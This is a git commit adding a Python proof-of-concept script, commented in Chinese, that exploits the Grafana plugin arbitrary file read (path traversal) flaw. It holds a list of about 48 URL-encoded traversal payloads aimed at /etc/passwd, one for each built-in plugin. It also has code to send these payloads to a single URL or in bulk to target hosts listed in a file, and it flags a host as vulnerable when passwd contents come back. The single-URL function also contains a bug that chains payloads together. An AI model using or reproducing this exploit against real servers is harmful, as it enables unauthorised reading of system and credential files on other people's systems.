9d7815a54806e240f1b39b3e192a63cbd09079f9
wnltt <2752490721@qq.com>
2021-12-09 14:09:57 +0800

    poc

---
+++ Grafana plugins 任意文件读取/Grafana_poc.py
@@ -0,0 +1,101 @@
+import urllib3
+import re
+
+payloads = ['/public/plugins/alertGroups/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+ '/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+  '/public/plugins/alertmanager/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+   '/public/plugins/annolist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+    '/public/plugins/barchart/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+     '/public/plugins/bargauge/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+      '/public/plugins/canvas/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+       '/public/plugins/cloudwatch/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+        '/public/plugins/dashboard/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+         '/public/plugins/dashlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+          '/public/plugins/debug/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+           '/public/plugins/elasticsearch/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+            '/public/plugins/gauge/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+             '/public/plugins/geomap/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+              '/public/plugins/gettingstarted/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+               '/public/plugins/grafana-azure-monitor-datasource/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                '/public/plugins/grafana/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                 '/public/plugins/graph/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                  '/public/plugins/graphite/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                   '/public/plugins/heatmap/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                    '/public/plugins/histogram/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                     '/public/plugins/influxdb/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                      '/public/plugins/jaeger/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                       '/public/plugins/live/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                        '/public/plugins/logs/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                         '/public/plugins/loki/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                          '/public/plugins/mixed/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                           '/public/plugins/mssql/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                            '/public/plugins/mysql/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                             '/public/plugins/news/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                              '/public/plugins/nodeGraph/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                               '/public/plugins/opentsdb/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                '/public/plugins/piechart/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                 '/public/plugins/pluginlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                 '/public/plugins/postgres/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                  '/public/plugins/prometheus/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                   '/public/plugins/stat/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                    '/public/plugins/state-timeline/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                     '/public/plugins/status-history/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                     '/public/plugins/table-old/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                      '/public/plugins/table/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                       '/public/plugins/tempo/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                        '/public/plugins/testdata/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                         '/public/plugins/text/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                          '/public/plugins/timeseries/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                           '/public/plugins/welcome/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                            '/public/plugins/xychart/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                                             '/public/plugins/zipkin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd']
+
+
+def request_url(url):    #请求函数 
+    http = urllib3.PoolManager()
+    response = http.request("GET", url, timeout=2)
+    return response
+
+def file_request(file):   #批量请求函数
+    with open(file) as f_url0:
+        for ip in f_url0:
+            for payload in payloads:
+                url = ip + payload
+                try:
+                    response = request_url(url)
+                    flag = re.findall('\w{1,9}:\w{1,2}:\w{1,7}:\w{1,7}:\w{1,9}:/', str(response.data))
+                    if (response.status) == 200 and flag:
+                        print('[+]'+ip+"存在漏洞，payload："+payload)
+                    else:
+                        pass
+                except:
+                    print("[-]请求超时或url无效")
+                    break
+    
+
+def url_request(url):   #单个检测处理函数
+    for payload in payloads:
+        url = url + payload
+        try:
+            response = request_url(url)
+            flag = re.findall('\w{1,9}:\w{1,2}:\w{1,7}:\w{1,7}:\w{1,9}:/', str(response.data))
+            if (response.status) == 200 and flag:
+                print("[+]存在漏洞，payload："+payload)
+            else:
+                pass
+        except:
+                print("[-]请求超时或url无效")
+
+def main():   #主函数
+    url_or_file = input("请输入url或者txt文件:")
+    if(re.findall('\.txt', url_or_file)):
+        file_request(url_or_file)
+
+    elif(re.findall('http://', url_or_file) or re.findall('https://', url_or_file)):
+        url_request(url_or_file)
+
+    else:
+        print("[-]不符合输入格式！")
+
+if __name__ == "__main__":
+    main()
